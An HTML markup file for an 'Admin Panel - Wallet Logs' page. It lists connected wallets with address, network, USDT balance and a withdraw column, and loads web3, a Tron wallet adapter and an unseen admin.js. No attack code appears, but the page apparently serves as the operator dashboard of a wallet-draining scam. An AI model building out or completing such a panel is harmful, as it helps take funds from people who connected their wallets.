<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel - Wallet Logs</title>
  <link rel="stylesheet" href="admin.css" />
</head>
<body>
  <div class="container">
    <h1>Admin Panel - Connected Wallets</h1>
    <table id="walletTable">
      <thead>
        <tr>
          <th>Address</th>
          <th>Network</th>
          <th>USDT Balance</th>
          <th>Withdraw</th>
        </tr>
      </thead>
      <tbody id="walletBody">
        <!-- Rows get inserted dynamically -->
      </tbody>
    </table>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@tronweb3/tronwallet-adapter/dist/index.min.js"></script>
  <script src="admin.js"></script>
</body>
</html>
